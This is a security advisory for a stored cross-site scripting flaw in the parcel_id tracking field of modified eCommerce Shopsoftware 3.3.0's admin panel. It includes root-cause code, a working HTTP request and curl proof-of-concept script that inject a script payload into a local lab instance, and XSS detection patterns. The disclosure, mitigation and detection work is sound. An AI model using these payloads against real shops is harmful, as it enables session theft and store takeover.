# Security Advisory: Stored XSS in `parcel_id` (modified eCommerce Shopsoftware 3.3.0)

> **Identifier:** CVE pending assignment / Internal ID **MS-2026-01**
> **Publication Date:** 11/11/2026
> **Last Updated:** 11/11/2026
> **Severity:** High
> **CVSS:** 8.0 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
> **Status:** Unpatched

---

## 1. Executive Summary

A **Stored / Persistent Cross-Site Scripting (CWE-79)** vulnerability has been identified in **modified eCommerce Shopsoftware**, version **3.3.0** (update from 2026-10-07), specifically within the order tracking component of the administrative panel. The `parcel_id` field (Shipment number / parcel label number / tracking number) in the "Track & Trace" form at `admin/orders.php?action=edit&oID=<id>` is persisted into `TABLE_ORDERS_TRACKING` without HTML sanitization and rendered without HTML-encoding in three distinct sinks, allowing the execution of arbitrary JavaScript within the context of an authenticated administrator. Successful exploitation allows an attacker to steal the `MODsid` session cookie, execute administrative actions on behalf of the victim, and fully compromise the store. The flaw was dynamically confirmed in an authorized laboratory environment.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | **3.3.0** (update 2026-10-07) and likely all versions containing the "Track & Trace" block | None | Affected |
| Component: `admin/includes/modules/orders_info_blocks.php` | 3.3.0 | None | Affected |
| Component: `includes/functions/get_tracking_link.inc.php` | 3.3.0 | None | Affected |

- **Repository / Ecosystem:** [https://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop)
- **Official Website:** [https://www.modified-shop.org](https://www.modified-shop.org/)
- **Evaluated stack:** PHP 8.x + MySQL/MariaDB, Apache 2.4 (Debian/Kali), Chromium
- **Test Environment:** `http://127.0.0.1:8080` (authorized local instance)

### Unaffected Products

- No other versions or products were evaluated in this advisory.

---

## 3. Vulnerability Description

The `parcel_id` field is saved without HTML sanitization — `xtc_db_prepare_input()` normalizes input for SQL only and does not escape HTML — and is re-rendered without encoding at three points on the `admin/orders.php?action=edit&oID=<id>` screen. The same value is also concatenated raw into the carrier URL template via `str_replace('$1', $parcel_id, ...)`, allowing XSS in the `href` attribute context.

By contrast, the `comments` field (`$orders_history['comments']`) is correctly handled via `xtc_db_output()` → `encode_htmlspecialchars()` → `htmlspecialchars($string, ENT_COMPAT, <encoding>)` and is **not** vulnerable. The flaw is strictly restricted to `parcel_id` / `tracking_link`, which do not pass through `xtc_db_output`.

**Root cause — `admin/includes/modules/orders_info_blocks.php:393`**

```php
<td class="smallText" align="left">
  <a href="<?php echo $tracking['tracking_link']; ?>" target="_blank">
    <?php echo $tracking['parcel_id']; ?>
  </a>
</td>
```

**Root cause — `admin/includes/modules/orders_info_blocks.php:505`**

```php
echo '<tr><td class="main">'.xtc_draw_checkbox_field('tracking_id[]', $tracking['tracking_id'], false).' '.$tracking['parcel_id'].'</td></tr>';
```

**Root cause — `includes/functions/get_tracking_link.inc.php:49`**

```php
$parcel_link[$i]['tracking_link'] = str_replace(
  array('$1','$2','$3','$4','$5'),
  array($tracking_link['parcel_id'], $lang_code, date('d', ...), date('m', ...), date('Y', ...)),
  $tracking_link['carrier_tracking_link']
);
```

**Data Flow**

```text
POST admin/orders.php?action=inserttracking&oID=<id>
  → $_POST['parcel_id']  (xtc_db_prepare_input — DOES NOT escape HTML)
  → INSERT into TABLE_ORDERS_TRACKING
  → get_tracking_link() reads raw value
  → str_replace('$1', parcel_id, carrier_tracking_link)
  → echo $tracking['parcel_id']      (line 393 — text context)
  → echo $tracking['tracking_link']  (line 393 — href attribute context)
  → echo $tracking['parcel_id']      (line 505 — text context)
```

### Necessary Conditions

- **Authentication:** Admin panel access required to inject directly (CSRF is mitigated in 3.3.0 via `CSRF_TOKEN_SYSTEM`, but the Stored XSS is independent of CSRF)
- **User interaction:** Required — the victim (another administrator) must open the `orders.php?action=edit&oID=<id>` screen that renders the stored data
- **Attack vector:** Network, POST method (`action=inserttracking`)
- **Preconditions:** At least one record must exist in `TABLE_CARRIERS` (valid `carrier_id`) for the insert not to fail due to a Foreign Key constraint

---

## 4. Impact

Exploitation allows an attacker to:

- **Confidentiality:** High — theft of the `MODsid` admin session cookie and exfiltration of customer data
- **Integrity:** High — execution of arbitrary administrative actions on behalf of the victim (modify orders/prices, create administrators, install a backdoor via modules)
- **Availability:** None — no direct availability impact

---

## 5. Classification

### CVSS

- **Score:** 8.0
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | High (H) |
| User Interaction (UI) | Required (R) |
| Scope (S) | Changed (C) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

> **PR:H Justification:** the direct injection vector requires administrative authentication. `CSRF_TOKEN_SYSTEM` mitigates the CSRF vector in `inserttracking`; therefore, injection requires a legitimate admin. Scope is Changed (S:C) because the JavaScript executes with admin privileges within the application context, affecting resources beyond the vulnerable component.

### CWE

- **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

### CAPEC (optional)

- **CAPEC-63:** Cross-Site Scripting (XSS)

---

## 6. Exploitation Scenario

1. An administrator (or attacker with a compromised admin account) accesses `admin/orders.php?action=edit&oID=<id>`.
2. In the "Track & Trace" block, selects a carrier and inserts the payload `<script>alert('XSS')</script>` into the `parcel_id` field, then clicks "Insert".
3. The value is persisted in `TABLE_ORDERS_TRACKING` without HTML encoding.
4. The page reloads in `action=edit`; the payload is rendered without encoding and executes in the browser.
5. Any other administrator who opens the same order will have the JavaScript executed in their context, allowing theft of `MODsid` and actions on their behalf.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/includes/modules/orders_info_blocks.php (lines 393, 505)
         includes/functions/get_tracking_link.inc.php (line 49)
         admin/orders.php (case 'inserttracking')
Parameter(s): parcel_id (POST)
Method: POST · Authentication: admin session required
Tested Version: 3.3.0 (update 2026-10-07)
```

### Example Request

```http
POST /admin/orders.php?action=inserttracking&oID=1 HTTP/1.1
Host: 127.0.0.1:8080
Cookie: MODsid=28ab48c0c486e8728eb7e98d98bb298c
Content-Type: application/x-www-form-urlencoded

carrier_id=1&parcel_id=%3Cscript%3Ealert%28%27Bem-vindo+XSS+a+RedScan+Academy%21%27%29%3C%2Fscript%3E
```

### Observed Response

```text
302 Found
Location: /admin/orders.php?oID=1&action=edit
```

Upon following the redirect, the vulnerable rendering occurs:

```html
<td class="smallText" align="left">
  <a href="https://track.example/<script>alert('Bem-vindo XSS a RedScan Academy!')</script>" target="_blank">
    <script>alert('Bem-vindo XSS a RedScan Academy!')</script>
  </a>
</td>
```

### Result

The payload `<script>alert('Bem-vindo XSS a RedScan Academy!')</script>` was inserted into the `parcel_id` field via the administrative interface (Track & Trace block, `admin/orders.php?action=edit&oID=1`). Upon reloading the page, the alert consistently triggered, confirming JavaScript execution within the administrator's context in the authorized laboratory at `http://127.0.0.1:8080`.

**Evidence:** Browser alert screenshots and source code inspection confirming unencoded rendering at lines 393 and 505 of `orders_info_blocks.php`.

---

## 8. Proof of Concept

This PoC is for use exclusively in authorized environments and demonstrates only the vulnerable behavior. Executable and non-destructive script: **`poc.sh`**.

```bash
#!/usr/bin/env bash
# non-destructive cycle (injects -> verifies -> restores)
BASE="http://127.0.0.1:8080"
COOKIE="MODsid=28ab48c0c486e8728eb7e98d98bb298c"
OID="1"
CARRIER="1"
PAYLOAD='<script>alert("Bem-vindo XSS a RedScan Academy!")</script>'
# 1) injects
curl -s -b "$COOKIE" -o /dev/null -w "%{http_code}\n" -X POST \
  "$BASE/admin/orders.php?action=inserttracking&oID=$OID" \
  --data-urlencode "carrier_id=$CARRIER" \
  --data-urlencode "parcel_id=$PAYLOAD"
# 2) verifies raw rendering
curl -s -b "$COOKIE" "$BASE/admin/orders.php?action=edit&oID=$OID" \
  | grep -F "$PAYLOAD" && echo "[VULNERABLE] payload rendered without encoding"
# 3) restores (removes the inserted tracking)
# curl -s -b "$COOKIE" "$BASE/admin/orders.php?action=deletetracking&tID=<tID>&oID=$OID"
```

### Expected Result

```text
302
[VULNERABLE] payload rendered without encoding
```

### PoC Limitations

- Does not intentionally cause service disruption.
- Does not remove or modify third-party data (injected state is restored via `action=deletetracking`).
- Does not create persistence or a backdoor.
- Does not contain real credentials (only test lab data).
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Set up an authorized instance of **modified eCommerce Shopsoftware 3.3.0** at `http://127.0.0.1:8080`.
2. Confirm that at least one carrier exists: `SELECT * FROM carriers;`.
3. Authenticate to the admin panel (`/admin/`).
4. Open `admin/orders.php?action=edit&oID=1` (or the `oID` of an order created in the lab).
5. In the **Track & Trace** block, select the carrier and insert the following into the `parcel_id` field: `<script>alert('Bem-vindo XSS a RedScan Academy!')</script>`
6. Click **Insert**.
7. The page reloads in `action=edit`; the payload is rendered without encoding and the alert executes.
8. Compare with the expected secure behavior (encoded output via `xtc_db_output`/`htmlspecialchars` and `tracking_link` with `urlencode` + `htmlspecialchars`).

---

## 10. Mitigation

Until the definitive fix is applied:

- Encode `parcel_id` with `xtc_db_output()` (or `htmlspecialchars($v, ENT_QUOTES, 'UTF-8')`) at lines 393 and 505 of `orders_info_blocks.php`.
- Encode `tracking_link` with `htmlspecialchars($v, ENT_QUOTES, 'UTF-8')` in the `href` attribute.
- Apply `urlencode($parcel_id)` before the `str_replace` in `get_tracking_link.inc.php:49`.
- Validate and restrict `parcel_id` input format (`preg_match('/^[A-Za-z0-9._\-]+$/', ...)`) as a defense-in-depth measure.
- Add `Content-Security-Policy: default-src 'self'` to the administrative panel.
- Restrict access to the admin panel via network ACL, WAF, VPN, or IP allowlist.
- Apply WAF/reverse proxy rules to block known XSS patterns (`<script`, `onerror=`, `onload=`, `onmouseover=`).
- Mark the `MODsid` cookie as `HttpOnly; Secure; SameSite=Strict` to reduce XSS impact.
- Review administrative permissions; invalidate potentially exposed sessions.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of the date of this advisory (product unpatched).**

When available, the following is recommended:

1. Update to the patched version or higher.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to the update.
5. Confirm that the vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

```php
// admin/includes/modules/orders_info_blocks.php:393
<td class="smallText" align="left">
  <a href="<?php echo htmlspecialchars($tracking['tracking_link'], ENT_QUOTES, 'UTF-8'); ?>" target="_blank">
    <?php echo xtc_db_output($tracking['parcel_id']); ?>
  </a>
</td>

// admin/includes/modules/orders_info_blocks.php:505
echo '<tr><td class="main">'.xtc_draw_checkbox_field('tracking_id[]', $tracking['tracking_id'], false).' '.xtc_db_output($tracking['parcel_id']).'</td></tr>';

// includes/functions/get_tracking_link.inc.php:49
$parcel_link[$i]['tracking_link'] = str_replace(
  array('$1','$2','$3','$4','$5'),
  array(urlencode($tracking_link['parcel_id']), $lang_code, date('d', ...), date('m', ...), date('Y', ...)),
  $tracking_link['carrier_tracking_link']
);
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Values persisted in `TABLE_ORDERS_TRACKING` (`parcel_id`) containing `<script`, `onerror=`, `onload=`, `<svg`, `onmouseover=`, `javascript:`.

### Example Log Search

```text
grep -Ei "(<script|onerror|onload|onmouseover|javascript:)" access.log | grep -E "orders.php.*inserttracking"
```

### Database Search

```sql
SELECT tracking_id, orders_id, parcel_id
FROM orders_tracking
WHERE parcel_id REGEXP '<|onerror|onload|onmouseover|javascript:';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 11/11/2026 | Vulnerability identified (static analysis of `orders.php` + `orders_info_blocks.php` + `get_tracking_link.inc.php`) in version 3.3.0 |
| 11/11/2026 | Dynamically confirmed in the authorized laboratory (`http://127.0.0.1:8080`) — version 3.3.0, update 2026-10-07 |
| 11/11/2026 | Re-validated live with evidence (browser + code) |
| 11/11/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notified |
| (pending) | CVE requested or reserved |
| (pending) | Fix made available |
| (pending) | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified eCommerce Shopsoftware Team (`modified-shop`)
- **Channel used:** Private GitHub Security Advisory (`modified-shop/modified-shop`, `SECURITY.md` present since July 2026) / official forum (`modified-shop.org`)
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor position:** N/A at this time

---

## 15. Credits

- **Researcher:** Luan Oliveira Ferreira de Almeida / Carlos Tuma / Thiago Smith
- **Organization:** Independent Security Research (RedScan Academy — CVE2 course)
- **Contact:** oliveira.luanalmeida@gmail.com / {TEAM_NAME}

---

## 16. References

- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CVSS calculator: https://www.first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1)
- [https://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop)
- [https://www.modified-shop.org](https://www.modified-shop.org/)

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 11/11/2026 | Initial publication — Stored XSS in `parcel_id` (version 3.3.0, update 2026-10-07) |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information presented was obtained in an authorized environment and disclosed responsibly. The author does not encourage the use of this information for unauthorized access, service interruption, privacy violation, or any illegal activity. Use of this information is the sole responsibility of the reader.

---

## 19. Contact

- **Email:** oliveira.luanalmeida@gmail.com / {TEAM_NAME}
- **Repository:** [https://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop)
